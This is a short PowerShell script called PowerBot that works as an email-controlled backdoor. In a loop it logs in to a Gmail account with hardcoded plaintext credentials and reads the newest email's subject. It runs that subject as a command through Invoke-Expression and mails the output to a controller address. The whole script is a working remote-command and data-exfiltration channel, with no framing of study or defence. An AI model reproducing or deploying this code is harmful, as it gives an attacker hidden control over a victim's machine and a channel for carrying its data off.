function PowerBot {

    while ($true){

    $Control = 'powershelldb@gmail.com'
    $Client = 'powershellbd@gmail.com'
    $Subject = 'PowerBot'
    $Username = 'powershellbd@gmail.com'
    $Password = 'Powershell'

    $SecureString = ConvertTo-SecureString $Password -AsPlainText -Force
    $credentials = New-Object System.Management.Automation.PSCredential $Username,$SecureString
    $webclient = new-object System.Net.WebClient
    $webclient.Credentials = $credentials

    [xml]$xml= $webclient.DownloadString("https://mail.google.com/mail/feed/atom")

    if (!$xml) {return}

        if (($xml.feed.entry) -ne $NULL) {

            $Id = $xml.feed.entry | Select-Object -First 1 | Format-table -Hidetableheaders -Property id | Out-String

            if ($Id -ne $LastId ) {

                $Input = $xml.feed.entry | Select-Object -First 1 | Format-table -Hidetableheaders -Property title | Out-String

                $Command = Invoke-Expression $Input | Out-String

                $Parameters  = @{
                    SmtpServer = 'smtp.gmail.com'
                    Port = 587
                    UseSsl = $true
                    Credential = $Credentials
                    From = $Client
                    To = $Control
                    Subject = $Subject
                    Body = $Command
                }
 
                Send-MailMessage @Parameters
                $LastId = $Id
            }

        }
    }
}
